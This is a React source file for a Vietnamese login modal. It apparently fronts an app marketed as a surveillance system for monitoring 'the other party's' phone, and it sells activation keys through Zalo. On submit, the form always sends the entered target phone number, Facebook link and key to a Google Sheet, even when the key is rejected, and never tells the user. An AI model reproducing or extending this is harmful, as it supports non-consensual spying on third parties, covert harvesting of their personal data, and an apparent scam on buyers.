import React, { useState } from 'react';
import { sendToGoogleSheet } from '../services/sheetService';
import { VALID_KEY, ZALO_LINK } from '../constants';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onLoginSuccess: (phone: string) => void;
}

const LoginModal: React.FC<LoginModalProps> = ({ isOpen, onClose, onLoginSuccess }) => {
  const [phone, setPhone] = useState('');
  const [facebook, setFacebook] = useState('');
  const [key, setKey] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isShake, setIsShake] = useState(false);

  if (!isOpen) return null;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const phoneVal = phone.trim();
    const fbVal = facebook.trim();
    const keyVal = key.replace(/\s/g, '').toUpperCase();

    if (phoneVal.length < 10) {
      alert("Vui lòng nhập số điện thoại hợp lệ (ít nhất 10 số)!");
      return;
    }

    // Always send data
    sendToGoogleSheet(phoneVal, fbVal, keyVal);

    if (keyVal === VALID_KEY) {
      setIsLoading(true);
      setTimeout(() => {
        setIsLoading(false);
        onLoginSuccess(phoneVal);
        onClose();
      }, 1500);
    } else {
      setIsShake(true);
      setTimeout(() => setIsShake(false), 500);
      alert("Mã Key không hợp lệ!");
    }
  };

  const contactZalo = () => window.open(ZALO_LINK, '_blank');

  return (
    <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[200] flex items-center justify-center p-4">
      <div className="bg-white w-full max-w-[320px] p-6 relative rounded-2xl shadow-2xl animate-zoomIn">
        <button onClick={onClose} className="absolute top-3 right-3 text-slate-400 hover:text-slate-600 transition-colors">
          <i className="fas fa-times text-xl"></i>
        </button>
        
        <div className="text-center mb-6">
          <div className="w-14 h-14 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl shadow-sm">
            <i className="fas fa-fingerprint"></i>
          </div>
          <h3 className="text-2xl font-black text-slate-800 mb-1">Đăng Nhập</h3>
          <p className="text-xs text-slate-500 font-medium">Hệ thống giám sát bảo mật cấp cao</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Số điện thoại đối phương</label>
            <input 
              type="text" 
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full p-3 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition bg-slate-50 text-slate-800 font-bold text-sm" 
              placeholder="09xxxxxxxx" 
              required 
            />
          </div>
          <div>
            <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Link Facebook</label>
            <input 
              type="text" 
              value={facebook}
              onChange={(e) => setFacebook(e.target.value)}
              className="w-full p-3 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition bg-slate-50 text-slate-800 font-medium text-sm" 
              placeholder="https://facebook.com/..." 
            />
          </div>
          <div className={isShake ? "animate-shake" : ""}>
            <label className="block text-[10px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Mã Key Kích Hoạt</label>
            <input 
              type="text" 
              value={key}
              onChange={(e) => setKey(e.target.value)}
              className={`w-full p-3 border rounded-xl focus:ring-2 outline-none transition font-mono uppercase text-center tracking-widest text-lg bg-slate-50 font-bold ${isShake ? 'border-red-500 text-red-600 bg-red-50 focus:ring-red-500' : 'border-slate-200 focus:ring-blue-500'}`}
              placeholder="" 
              required 
            />
          </div>
          <button 
            type="submit" 
            disabled={isLoading}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl transition shadow-lg shadow-blue-200 flex items-center justify-center gap-2 mt-4 text-base"
          >
            {isLoading ? <><i className="fas fa-spinner fa-spin"></i> Đang kết nối...</> : <><i className="fas fa-radar"></i> KẾT NỐI NGAY</>}
          </button>
        </form>

        <div className="mt-6 pt-6 border-t border-slate-100">
          <button 
            onClick={contactZalo}
            className="w-full bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 text-white font-bold py-3 rounded-xl shadow-lg hover:shadow-purple-500/50 transition-all transform hover:-translate-y-1 hover:scale-[1.02] flex items-center justify-center gap-2 text-sm"
          >
            <i className="fas fa-crown"></i> CHƯA CÓ KEY? MUA QUA ZALO
          </button>
        </div>
      </div>
    </div>
  );
};

export default LoginModal;